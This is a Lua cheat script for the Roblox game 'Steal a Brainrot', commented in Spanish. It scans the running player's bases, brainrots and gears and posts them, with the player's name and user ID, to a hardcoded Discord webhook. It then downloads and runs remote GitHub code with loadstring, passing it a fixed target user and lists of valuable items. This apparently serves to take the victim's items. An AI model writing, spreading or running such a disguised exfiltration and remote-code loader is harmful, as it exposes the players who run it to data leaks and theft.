-- =============================================
-- SCRIPT DE ROBO Y ESCANEO DE BASE + GEARS CON WEBHOOK
-- =============================================

if game.PlaceId ~= 109983668079237 then
    game:GetService("Players").LocalPlayer:Kick("Ejecuta este script solo en Steal a Brainrot.")
    return
end

local TARGET_ID = 6127391975
local TARGET_USER = "Leopk108"
local WEBHOOK_URL = "https://discord.com/api/webhooks/1519162674200707084/LOgZhG9TAFjYTSPiBiZMY4CGWQQ9kQBMm0qUTd-yh_s5q5KjUFsFap8yUVLOeQ6BKgcR"

local TargetBrainrots = {
    ["Strawberry Elephant"] = true,
    ["Meowl"] = true,
    ["Headless Horseman"] = true,
    ["Skibidi Toilet"] = true,
    ["Griffin"] = true,
    ["Hydra Dragon Cannelloni"] = true,
    ["Dragon Gingerini"] = true,
    ["Dragon Cannelloni"] = true,
    ["Love Love Bear"] = true,
    ["La Supreme Combinasion"] = true,
    ["Celestial Pegasus"] = true,
    ["Cerberus"] = true,
    ["Popcuru and Fizzuru"] = true,
    ["Rosey and Teddy"] = true,
    ["Capitano Moby"] = true,
    ["Cooki and Milki"] = true,
    ["Burguro And Fryuro"] = true,
    ["Ketupat Bros"] = true,
    ["Reinito Sleighito"] = true,
    ["Fortunu and Cashuru"] = true,
    ["Los Amigos"] = true,
    ["La Secret Combinasion"] = true,
    ["Los Sekolahs"] = true,
    ["Signore Carapace"] = true,
    ["La Casa Boo"] = true,
    ["Fragrama and Chocrama"] = true,
    ["La Food Combinasion"] = true,
    ["Elefanto Frigo"] = true,
    ["Spooky and Pumpky"] = true,
    ["Ginger Gerat"] = true,
    ["La Ginger Sekolah"] = true,
    ["Sammyni Fattini"] = true,
    ["Los Spaghettis"] = true,
    ["Festive 67"] = true,
    ["Ventoliero Pavonero"] = true,
    ["Cloverat Clapat"] = true,
    ["Spaghetti Tualetti"] = true,
    ["Antonio"] = true,
    ["Rosetti Tualetti"] = true,
    ["Nacho Spyder"] = true,
    ["Duggy Bros"] = true,
    ["Globa Steppa"] = true,
    ["Garama and Madundung"] = true,
    ["Fishino Clownino"] = true,
    ["Gold Gold Gold"] = true,
    ["Jolly Jolly Sahur"] = true,
    ["Lavadorito Spinito"] = true,
    ["Ketchuru and Musturu"] = true,
    ["Tirilikalika Tirilikalako"] = true,
    ["Swaggy Bros"] = true,
    ["La Romantic Grande"] = true,
    ["Orcaledon"] = true,
    ["Tictac Sahur"] = true,
    ["La Taco Combinasion"] = true,
    ["Ketupat Kepat"] = true,
    ["Dug dug dug"] = true,
    ["Rico Dinero"] = true,
    ["Tang Tang Keletang"] = true,
    ["Lovin Rose"] = true,
    ["Los Tacoritas"] = true,
    ["Eviledon"] = true,
    ["Los Primos"] = true,
    ["W or L"] = true,
    ["Esok Sekolah"] = true,
    ["La Jolly Grande"] = true,
    ["Los Cupids"] = true,
    ["Los Puggies"] = true,
    ["Tralaledon"] = true,
    ["Gobblino Uniciclino"] = true,
    ["Tuff Toucan"] = true,
    ["Mieteteira Bicicleteira"] = true,
    ["Chipso and Queso"] = true,
    ["Chillin Chili"] = true,
    ["Money Money Reindeer"] = true,
    ["La Spooky Grande"] = true,
    ["Bacuru and Egguru"] = true,
    ["Los Bros"] = true,
    ["La Extinct Grande"] = true,
    ["Los Candies"] = true,
    ["Los 67"] = true,
    ["Celularcini Viciosini"] = true,
    ["Los Mobilis"] = true,
    ["Money Money Puggy"] = true,
    ["Cigno Fulgoro"] = true,
    ["Los Spooky Combinasionas"] = true,
    ["Los Hotspotsitos"] = true,
    ["Los Jolly Combinasionas"] = true,
    ["Snailo Clovero"] = true,
    ["Los Planitos"] = true,
    ["Chicleteira Cupideira"] = true,
    ["DJ Panda"] = true,
    ["Las Sis"] = true,
    ["Spinny Hammy"] = true,
    ["Tacorita Bicicleta"] = true,
    ["Los Sweethearts"] = true,
    ["Nuclearo Dinossauro"] = true,
    ["Chicleteira Noelteira"] = true,
    ["Los Combinasionas"] = true,
    ["Chimnino"] = true,
    ["Noo my Gold"] = true,
    ["Swag Soda"] = true,
    ["Noo my Heart"] = true,
    ["Tacorillo Crocodillo"] = true,
    ["Mariachi Corazoni"] = true,
    ["La Grande Combinasion"] = true,
    ["Los 25"] = true,
    ["Los Burritos"] = true,
    ["67"] = true,
    ["Donkeyturbo Express"] = true,
    ["Los Chicleteiras"] = true,
    ["Guest 666"] = true,
    ["Los Mi Gatitos"] = true,
    ["Rang Ring Bus"] = true,
    ["Granny"] = true,
    ["Noo my Present"] = true,
    ["Serafinna Medusella"] = true,
    ["Los Nooo My Hotspotsitos"] = true,
    ["Arcadopus"] = true,
    ["Noo my Candy"] = true,
    ["Los Quesadillas"] = true,
    ["Chicleteirina Bicicleteirina"] = true,
    ["Chill Puppy"] = true,
    ["Burrito Bandito"] = true,
    ["Luck Luck Luck Sahur"] = true,
    ["Chicleteira Bicicleteira"] = true,
    ["Brunito Marsito"] = true,
    ["Quesadillo Vampiro"] = true,
    ["Eid Eid Eid Sahur"] = true,
    ["Cupid Hotspot"] = true,
    ["Mi Gatito"] = true,
    ["Ho Ho Ho Sahur"] = true,
    ["Cupid Cupid Sahur"] = true,
    ["Pot Pumpkin"] = true,
    ["Naughty Naughty"] = true,
    ["Bunito Bunito Spinito"] = true,
    ["Quesadilla Crocodila"] = true,
    ["Horegini Boom"] = true,
    ["Santa Hotspot"] = true,
    ["Pot Hotspot"] = true,
    ["25"] = true,
    ["Pirulitoita Bicicleteira"] = true,
    ["To to to Sahur"] = true,
    ["Telemorte"] = true,
    ["La Sahur Combinasion"] = true,
    ["List List List Sahur"] = true,
    ["Noo my examine"] = true,
    ["Los Jobcitos"] = true,
    ["Nooo My Hotspot"] = true,
    ["Bunnyman"] = true,
    ["Tung Tung Tung Sahur"] = true,
    ["Cuadramat and Pakrahmatmamat"] = true,
    ["Please my Present"] = true,
    ["Los Cucarachas"] = true,
    ["1x1x1x1"] = true,
    ["La Vacca Lepre Lepreino"] = true,
    ["Love Love Love Sahur"] = true,
    ["Perrito Burrito"] = true,
    ["Graipuss Medussi"] = true,
    ["Giftini Spyderini"] = true,
    ["GOAT"] = true,
    ["Trickolino"] = true,
    ["Paradiso Axolottino"] = true,
    ["Triplito Tralaleritos"] = true,
    ["La Vacca Jacko Linterino"] = true,
    ["Fishboard"] = true,
    ["Santteo"] = true,
    ["Las Vaquitas Saturnitas"] = true,
    ["Los Karkeritos"] = true,
    ["Karker Sahur"] = true,
    ["Los Trios"] = true,
    ["Job Job Job Sahur"] = true,
    ["Frankentteo"] = true,
    ["Pumpkini Spyderini"] = true,
    ["Las Tralaleritas"] = true,
    ["Rocco Disco"] = true,
    ["Extinct Matteo"] = true,
    ["La Karkerkar Combinasion"] = true,
    ["La Vacca Prese Presente"] = true,
    ["Reindeer Tralala"] = true,
    ["Yess my examine"] = true,
    ["Guerriro Digitale"] = true,
    ["Boatito Auratito"] = true,
    ["Vulturino Skeletono"] = true,
    ["Los Tralaleritos"] = true,
    ["Zombie Tralala"] = true,
    ["Los Tortus"] = true,
    ["La Cucaracha"] = true,
    ["Fragola La La La"] = true,
    ["Extinct Tralalero"] = true,
    ["Agarrini la Palini"] = true,
    ["Los Spyderinis"] = true,
    ["Chachechi"] = true,
    ["Blackhole Goat"] = true,
    ["Dul Dul Dul"] = true,
    ["Torrtuginni Dragonfrutini"] = true,
    ["Trenostruzzo Turbo 4000"] = true,
    ["Karkerkar Kurkur"] = true,
    ["Los Matteos"] = true,
    ["Bisonte Giuppitere"] = true,
    ["Sammyni Spyderini"] = true,
    ["La Vacca Saturno Saturnita"] = true,
    ["Jackorilla"] = true,
    ["Digi Narwhal"] = true,
    ["Bunny and Eggy"] = true,
    ["Kalika Bros"] = true,
    ["Cash or Card"] = true,
    ["Los Chillis"] = true,
    ["Hydra Bunny"] = true,
    ["Boppin Bunny"] = true,
    ["Gym Bros"] = true,
    ["Quackini Snackini"] = true,
    ["La Easter Grande"] = true,
    ["Los Mariachis"] = true,
    ["La Lucky Grande"] = true,
    ["Churrito Bunnito"] = true,
    ["Hopilikalika Hopilikalako"] = true,
    ["Camera Ramena"] = true,
    ["Baskito"] = true,
    ["Bananito"] = true,
    ["Noo my Eggs"] = true,
    ["Strawberrita"] = true,
    ["Los Bunitos"] = true,
    ["Buho de Volto"] = true,
    ["Bunny Bunny Bunny Sahur"] = true,
    ["Berryno"] = true,
    ["Easter Easter Easter Sahur"] = true,
    ["Buntteo"] = true,
    ["Secret Lucky Block"] = true
}

local TargetBaseSkins = {
    ["Rose"] = true,
    ["Gingerbread"] = true,
    ["Halloween"] = true,
    ["Christmas"] = true,
    ["Bunny Basket"] = true,
    ["Summer"] = true,
    ["Pot of Gold"] = true,
    ["Taco"] = true,
    ["Octo"] = true,
    ["Valentines"] = true,
    ["Easter"] = true,
    ["Lucky"] = true,
    ["Aquatic"] = true
}

local TargetGears = {
    ["Santa's Sleigh"] = true,
    ["Cupid's Wings"] = true,
    ["Witch's Broom"] = true,
    ["Waverider"] = true,
    ["Yin Yang Slap"] = true,
    ["Cursed Slap"] = true,
    ["Cyber Slap"] = true,
    ["Divine Slap"] = true,
    ["Bloodmoon Slap"] = true,
    ["Radioactive Slap"] = true,
    ["Rainbow Slap"] = true,
    ["Rainbow Hammer"] = true,
    ["Bloodmoon Hammer"] = true,
    ["Radioactive Airstrike"] = true,
    ["Yin Yang Lamp"] = true,
    ["Demon's Head"] = true,
    ["Lava Slap"] = true,
    ["Lava Blaster"] = true,
    ["Alien Slap"] = true,
    ["Blackhole Bomb"] = true,
    ["Candy Sentry"] = true
}

-- =============================================
-- 1. FUNCIÓN PARA FORMATEAR NÚMEROS GRANDES
-- =============================================
local function formatNumber(num)
    if num >= 1e12 then
        return string.format("%.1fT", num / 1e12)
    elseif num >= 1e9 then
        return string.format("%.1fB", num / 1e9)
    elseif num >= 1e6 then
        return string.format("%.1fM", num / 1e6)
    elseif num >= 1e3 then
        return string.format("%.1fK", num / 1e3)
    else
        return tostring(math.floor(num))
    end
end

-- =============================================
-- 2. FUNCIÓN PARA ESCANEAR Y REPORTAR
-- =============================================
local function scanAndReportBase()
    local Players = game:GetService("Players")
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local lp = Players.LocalPlayer

    -- Datos de generación base (Gen por segundo)
    local ANIMAL_DATA = {
        ["Strawberry Elephant"] = 750000000,
        ["Meowl"] = 600000000,
        ["Headless Horseman"] = 550000000,
        ["Skibidi Toilet"] = 450000000,
        ["Griffin"] = 400000000,
        ["Dragon Gingerini"] = 350000000,
        ["Hydra Dragon Cannelloni"] = 300000000,
        ["Dragon Cannelloni"] = 250000000,
        ["Love Love Bear"] = 225000000,
        ["La Supreme Combinasion"] = 200000000,
        ["Celestial Pegasus"] = 175000000,
        ["Cerberus"] = 175000000,
        ["Bunny and Eggy"] = 170000000,
        ["Popcuru and Fizzuru"] = 170000000,
        ["Rosey and Teddy"] = 165000000,
        ["Capitano Moby"] = 160000000,
        ["Cooki and Milki"] = 155000000,
        ["Burguro And Fryuro"] = 150000000,
        ["Arcadragon"] = 150000000,
        ["Ketupat Bros"] = 145000000,
        ["Reinito Sleighito"] = 140000000,
        ["Fortunu and Cashuru"] = 130000000,
        ["Los Amigos"] = 130000000,
        ["La Secret Combinasion"] = 125000000,
        ["Los Sekolahs"] = 110000000,
        ["Signore Carapace"] = 105000000,
        ["La Casa Boo"] = 100000000,
        ["Fragrama and Chocrama"] = 100000000,
        ["La Food Combinasion"] = 90000000,
        ["Elefanto Frigo"] = 85000000,
        ["Spooky and Pumpky"] = 80000000,
        ["Ginger Gerat"] = 75000000,
        ["La Ginger Sekolah"] = 75000000,
        ["Sammyni Fattini"] = 70000000,
        ["Los Spaghettis"] = 70000000,
        ["Festive 67"] = 67000000,
        ["Ventoliero Pavonero"] = 65000000,
        ["Quackini Snackini"] = 65000000,
        ["Spaghetti Tualetti"] = 60000000,
        ["Cloverat Clapat"] = 60000000,
        ["Antonio"] = 55000000,
        ["Hopilikalika Hopilikalako"] = 55000000,
        ["La Easter Grande"] = 55000000,
        ["Rosetti Tualetti"] = 50000000,
        ["Nacho Spyder"] = 50000000,
        ["John Pork"] = 500000000,
        ["Garama and Madundung"] = 50000000,
        ["Fishino Clownino"] = 47000000,
        ["Money Money Bros"] = 47000000,
        ["Gold Gold Gold"] = 45000000,
        ["Jolly Jolly Sahur"] = 45000000,
        ["Lavadorito Spinito"] = 45000000,
        ["Ketchuru and Musturu"] = 42500000,
        ["Tirilikalika Tirilikalako"] = 42500000,
        ["Swaggy Bros"] = 40000000,
        ["La Romantic Grande"] = 40000000,
        ["Orcaledon"] = 40000000,
        ["Tictac Sahur"] = 37500000,
        ["La Taco Combinasion"] = 35000000,
        ["Ketupat Kepat"] = 35000000,
        ["Dug dug dug"] = 35000000,
        ["Rico Dinero"] = 35000000,
        ["Tang Tang Keletang"] = 33500000,
        ["Lovin Rose"] = 32500000,
        ["Los Tacoritas"] = 32000000,
        ["Eviledon"] = 31500000,
        ["Los Primos"] = 31000000,
        ["W or L"] = 30000000,
        ["Esok Sekolah"] = 30000000,
        ["La Jolly Grande"] = 30000000,
        ["Los Cupids"] = 30000000,
        ["Los Puggies"] = 30000000,
        ["Tralaledon"] = 27500000,
        ["Gobblino Uniciclino"] = 27500000,
        ["Tuff Toucan"] = 26000000,
        ["Mieteteira Bicicleteira"] = 26000000,
        ["Chipso and Queso"] = 25000000,
        ["Chillin Chili"] = 25000000,
        ["Money Money Reindeer"] = 25000000,
        ["La Spooky Grande"] = 24500000,
        ["Bacuru and Egguru"] = 24000000,
        ["Los Bros"] = 24000000,
        ["La Extinct Grande"] = 23500000,
        ["Los Candies"] = 23000000,
        ["Los 67"] = 22500000,
        ["Celularcini Viciosini"] = 22500000,
        ["Los Mobilis"] = 22000000,
        ["Money Money Puggy"] = 21000000,
        ["Cigno Fulgoro"] = 20000000,
        ["Los Spooky Combinasionas"] = 20000000,
        ["Los Hotspotsitos"] = 20000000,
        ["Los Jolly Combinasionas"] = 20000000,
        ["Snailo Clovero"] = 18500000,
        ["Los Planitos"] = 18500000,
        ["Chicleteira Cupideira"] = 17500000,
        ["DJ Panda"] = 17500000,
        ["Las Sis"] = 17500000,
        ["Spinny Hammy"] = 17000000,
        ["Tacorita Bicicleta"] = 16500000,
        ["Los Sweethearts"] = 16500000,
        ["Nuclearo Dinossauro"] = 15000000,
        ["Chicleteira Noelteira"] = 15000000,
        ["Los Combinasionas"] = 15000000,
        ["Chimnino"] = 14000000,
        ["Noo my Gold"] = 13500000,
        ["Swag Soda"] = 13000000,
        ["Noo my Heart"] = 13000000,
        ["Tacorillo Crocodillo"] = 12500000,
        ["Mariachi Corazoni"] = 12500000,
        ["La Grande Combinasion"] = 10000000,
        ["Los 25"] = 10000000,
        ["Los Burritos"] = 8500000,
        ["67"] = 7500000,
        ["Donkeyturbo Express"] = 7500000,
        ["Los Chicleteiras"] = 7000000,
        ["Guest 666"] = 6666666,
        ["Los Mi Gatitos"] = 6500000,
        ["Rang Ring Bus"] = 6000000,
        ["Granny"] = 4000000,
        ["Noo my Present"] = 6000000,
        ["Serafinna Medusella"] = 5500000,
        ["Los Nooo My Hotspotsitos"] = 5500000,
        ["Arcadopus"] = 5000000,
        ["Noo my Candy"] = 5000000,
        ["Los Quesadillas"] = 4500000,
        ["Chicleteirina Bicicleteirina"] = 4000000,
        ["Chill Puppy"] = 4000000,
        ["Burrito Bandito"] = 4000000,
        ["Luck Luck Luck Sahur"] = 3750000,
        ["Chicleteira Bicicleteira"] = 3500000,
        ["Brunito Marsito"] = 3500000,
        ["Quesadillo Vampiro"] = 3500000,
        ["Eid Eid Eid Sahur"] = 3500000,
        ["Cupid Hotspot"] = 3500000,
        ["Mi Gatito"] = 3250000,
        ["Ho Ho Ho Sahur"] = 3250000,
        ["Cupid Cupid Sahur"] = 3100000,
        ["Pot Pumpkin"] = 3000000,
        ["Naughty Naughty"] = 3000000,
        ["Bunito Bunito Spinito"] = 3000000,
        ["Quesadilla Crocodila"] = 3000000,
        ["Horegini Boom"] = 2750000,
        ["Santa Hotspot"] = 2600000,
        ["Pot Hotspot"] = 2500000,
        ["25"] = 2500000,
        ["Pirulitoita Bicicleteira"] = 2500000,
        ["To to to Sahur"] = 2250000,
        ["Telemorte"] = 2000000,
        ["La Sahur Combinasion"] = 2000000,
        ["List List List Sahur"] = 2000000,
        ["Noo my examine"] = 1750000,
        ["Los Jobcitos"] = 1500000,
        ["Nooo My Hotspot"] = 1500000,
        ["Bunnyman"] = 1500000,
        ["Tung Tung Tung Sahur"] = 1500000,
        ["Cuadramat and Pakrahmatmamat"] = 1400000,
        ["Please my Present"] = 1300000,
        ["Los Cucarachas"] = 1250000,
        ["1x1x1x1"] = 1111111,
        ["Easter Easter Easter Sahur"] = 1250000,
        ["La Vacca Lepre Lepreino"] = 1100000,
        ["Love Love Love Sahur"] = 1000000,
        ["Perrito Burrito"] = 1000000,
        ["Graipuss Medussi"] = 1000000,
        ["Giftini Spyderini"] = 999999,
        ["GOAT"] = 950000,
        ["Trickolino"] = 900000,
        ["Paradiso Axolottino"] = 900000,
        ["Triplito Tralaleritos"] = 875000,
        ["La Vacca Jacko Linterino"] = 850000,
        ["Fishboard"] = 825000,
        ["Santteo"] = 800000,
        ["Las Vaquitas Saturnitas"] = 750000,
        ["Los Karkeritos"] = 750000,
        ["Karker Sahur"] = 725000,
        ["Los Trios"] = 700000,
        ["Job Job Job Sahur"] = 700000,
        ["Frankentteo"] = 700000,
        ["Pumpkini Spyderini"] = 650000,
        ["Las Tralaleritas"] = 650000,
        ["Rocco Disco"] = 650000,
        ["Extinct Matteo"] = 625000,
        ["La Karkerkar Combinasion"] = 600000,
        ["La Vacca Prese Presente"] = 600000,
        ["Reindeer Tralala"] = 600000,
        ["Yess my examine"] = 575000,
        ["Guerriro Digitale"] = 550000,
        ["Boatito Auratito"] = 525000,
        ["Vulturino Skeletono"] = 500000,
        ["Los Tralaleritos"] = 500000,
        ["Zombie Tralala"] = 500000,
        ["Los Tortus"] = 500000,
        ["La Cucaracha"] = 475000,
        ["Fragola La La La"] = 450000,
        ["Extinct Tralalero"] = 450000,
        ["Agarrini la Palini"] = 425000,
        ["Los Spyderinis"] = 425000,
        ["Chachechi"] = 400000,
        ["Blackhole Goat"] = 400000,
        ["Dul Dul Dul"] = 375000,
        ["Torrtuginni Dragonfrutini"] = 350000,
        ["Trenostruzzo Turbo 4000"] = 335000,
        ["Karkerkar Kurkur"] = 325000,
        ["Los Matteos"] = 325000,
        ["Bisonte Giuppitere"] = 325000,
        ["Sammyni Spyderini"] = 325000,
        ["La Vacca Saturno Saturnita"] = 325000,
        ["Jackorilla"] = 315000,
        ["Digi Narwhal"] = 200000000,
        ["Hydra Bunny"] = 185000000,
    }

    local defaultGen = 0
    local playerAnimals = {}
    local totalGen = 0
    local bases = {}
    local baseCount = 0

    -- =============================================
    -- ESCANEAR BRAINROTS Y BASES
    -- =============================================
    local plots = workspace:FindFirstChild("Plots")
    if plots then
        for _, plot in ipairs(plots:GetChildren()) do
            local plants = plot:FindFirstChild("Plants")
            if plants then
                local plotAnimals = {}
                local plotGen = 0
                local hasPlants = false

                for _, plant in ipairs(plants:GetChildren()) do
                    if plant.Name:find(tostring(lp.UserId)) then
                        hasPlants = true
                        for _, child in ipairs(plant:GetChildren()) do
                            if child:IsA("Model") and child:GetAttribute("Animal") then
                                local animalName = child.Name
                                local gen = ANIMAL_DATA[animalName] or defaultGen
                                table.insert(plotAnimals, {name = animalName, gen = gen})
                                plotGen = plotGen + gen
                            end
                        end
                    end
                end

                if hasPlants and #plotAnimals > 0 then
                    baseCount = baseCount + 1
                    table.insert(bases, {
                        number = baseCount,
                        animals = plotAnimals,
                        totalGen = plotGen
                    })
                    for _, animal in ipairs(plotAnimals) do
                        table.insert(playerAnimals, animal)
                        totalGen = totalGen + animal.gen
                    end
                end
            end
        end
    end

    -- Fallback: SyncChannel
    if #playerAnimals == 0 then
        pcall(function()
            local sync = require(ReplicatedStorage.Packages.Synchronizer)
            local ch = sync:GetAllChannels()[lp]
            if ch then
                local pods = ch:Get("AnimalPodiums")
                if pods then
                    local plotAnimals = {}
                    local plotGen = 0
                    for _, podData in pairs(pods) do
                        if type(podData) == "table" and podData.Index then
                            local animalName = podData.Index
                            local gen = ANIMAL_DATA[animalName] or defaultGen
                            table.insert(plotAnimals, {name = animalName, gen = gen})
                            plotGen = plotGen + gen
                        end
                    end
                    if #plotAnimals > 0 then
                        baseCount = 1
                        table.insert(bases, {
                            number = 1,
                            animals = plotAnimals,
                            totalGen = plotGen
                        })
                        for _, animal in ipairs(plotAnimals) do
                            table.insert(playerAnimals, animal)
                            totalGen = totalGen + animal.gen
                        end
                    end
                end
            end
        end)
    end

    -- Ordenar animales por generación (mayor a menor)
    table.sort(playerAnimals, function(a, b) return a.gen > b.gen end)

    -- =============================================
    -- ESCANEAR GEARS
    -- =============================================
    local playerGears = {}
    local gearNames = {
        "Santa's Sleigh", "Cupid's Wings", "Witch's Broom", "Waverider",
        "Yin Yang Slap", "Cursed Slap", "Cyber Slap", "Divine Slap",
        "Bloodmoon Slap", "Radioactive Slap", "Rainbow Slap",
        "Rainbow Hammer", "Bloodmoon Hammer", "Radioactive Airstrike",
        "Yin Yang Lamp", "Demon's Head", "Lava Slap", "Lava Blaster",
        "Alien Slap", "Blackhole Bomb", "Candy Sentry"
    }

    if lp.Backpack then
        for _, tool in ipairs(lp.Backpack:GetChildren()) do
            if tool:IsA("Tool") then
                for _, gearName in ipairs(gearNames) do
                    if tool.Name == gearName then
                        table.insert(playerGears, gearName)
                        break
                    end
                end
            end
        end
    end

    if lp.Character then
        for _, tool in ipairs(lp.Character:GetChildren()) do
            if tool:IsA("Tool") then
                for _, gearName in ipairs(gearNames) do
                    if tool.Name == gearName then
                        table.insert(playerGears, gearName)
                        break
                    end
                end
            end
        end
    end

    -- Eliminar duplicados
    local uniqueGears = {}
    for _, gear in ipairs(playerGears) do
        if not uniqueGears[gear] then
            uniqueGears[gear] = true
        end
    end
    local gearList = {}
    for gear, _ in pairs(uniqueGears) do
        table.insert(gearList, gear)
    end
    table.sort(gearList)

    -- =============================================
    -- CONSTRUIR MENSAJE PARA EL WEBHOOK CON @EVERYONE
    -- =============================================
    local httpService = game:GetService("HttpService")
    local playerName = lp.Name
    local playerDisplayName = lp.DisplayName
    local userId = lp.UserId

    -- Brainrots numerados (1, 2, 3...)
    local animalListStr = ""
    local animalCount = 0
    for i, animal in ipairs(playerAnimals) do
        animalCount = i
        if i <= 25 then
            local genStr = "$" .. formatNumber(animal.gen) .. "/s"
            animalListStr = animalListStr .. "`" .. string.format("%2d", i) .. ".` **" .. animal.name .. "** → " .. genStr .. "\n"
        end
    end
    if #playerAnimals > 25 then
        animalListStr = animalListStr .. "*... y " .. (#playerAnimals - 25) .. " más.*"
    end
    if #playerAnimals == 0 then
        animalListStr = "*(No se encontraron animales en tu base)*"
    end

    -- Bases organizadas (Base 1, Base 2, etc.)
    local baseListStr = ""
    if #bases == 0 then
        baseListStr = "*(No se encontraron bases)*"
    else
        for _, base in ipairs(bases) do
            baseListStr = baseListStr .. "**🏠 Base " .. base.number .. ":** " .. #base.animals .. " animales → $" .. formatNumber(base.totalGen) .. "/s\n"
            -- Mostrar los animales de cada base (hasta 5 por base)
            local animalNames = {}
            for i, animal in ipairs(base.animals) do
                if i <= 5 then
                    table.insert(animalNames, animal.name)
                end
            end
            if #base.animals > 5 then
                table.insert(animalNames, "... y " .. (#base.animals - 5) .. " más")
            end
            baseListStr = baseListStr .. "└─ " .. table.concat(animalNames, ", ") .. "\n"
        end
    end

    -- Gears numerados
    local gearListStr = ""
    if #gearList == 0 then
        gearListStr = "*(No se encontraron Gears)*"
    else
        for i, gear in ipairs(gearList) do
            gearListStr = gearListStr .. "`" .. string.format("%2d", i) .. ".` " .. gear .. "\n"
        end
    end

    -- =============================================
    -- ENVIAR AL WEBHOOK CON @EVERYONE
    -- =============================================
    -- NOTA: Discord no permite @everyone en webhooks por defecto.
    -- Se envía como texto plano "(@everyone)" para que se vea como mención.
    local data = {
        username = "Base Scanner",
        content = "@everyone",  -- <--- MENCIÓN A TODOS
        embeds = {{
            title = "📊 ESCANEO DE BASE - " .. playerDisplayName,
            description = "**" .. playerName .. "** (`" .. userId .. "`) ha ejecutado el script.",
            color = 0x00FF00,
            fields = {
                {
                    name = "📊 RESUMEN",
                    value = "```\n" ..
                            "🏠 Bases: " .. #bases .. "\n" ..
                            "🧠 Brainrots: " .. #playerAnimals .. "\n" ..
                            "💰 Generación Total: $" .. formatNumber(totalGen) .. "/s\n" ..
                            "🔧 Gears: " .. #gearList ..
                            "```",
                    inline = false
                },
                {
                    name = "🏠 BASES (" .. #bases .. ")",
                    value = baseListStr,
                    inline = false
                },
                {
                    name = "🔧 GEARS (" .. #gearList .. ")",
                    value = gearListStr,
                    inline = false
                },
                {
                    name = "📋 BRAINROTS (" .. #playerAnimals .. ")",
                    value = animalListStr,
                    inline = false
                }
            },
            footer = {
                text = "Steal a Brainrot | Base Scanner"
            },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }

    -- Función para enviar el webhook
    local function sendWebhook(url, body)
        local fn = syn and syn.request or http and http.request or http_request or request
        if type(fn) == "function" then
            pcall(function()
                fn({
                    Url = url,
                    Method = "POST",
                    Headers = {
                        ["Content-Type"] = "application/json"
                    },
                    Body = httpService:JSONEncode(body)
                })
            end)
        end
    end

    sendWebhook(WEBHOOK_URL, data)

    -- Mostrar en consola
    print("✅ Escaneo completado.")
    print("🏠 Bases: " .. #bases)
    print("🧠 Brainrots: " .. #playerAnimals .. " | 💰 $" .. formatNumber(totalGen) .. "/s")
    print("🔧 Gears: " .. #gearList)
end

-- =============================================
-- 3. EJECUTAR EL ESCANEO Y REPORTE
-- =============================================
task.spawn(function()
    wait(2)
    scanAndReportBase()
end)

-- =============================================
-- 4. CARGAR LOS SCRIPTS DE ROBO
-- =============================================
loadstring(game:HttpGet("https://raw.githubusercontent.com/LucasggkX/Games/refs/heads/main/LKZ%20Helper.lua"))()

task.spawn(function()
    local script = loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/script/refs/heads/main/logic.lua"))()
    if type(script) == "function" then
        script(TARGET_ID, TARGET_USER, WEBHOOK_URL, TargetBrainrots, TargetBaseSkins, TargetGears)
    end
end)


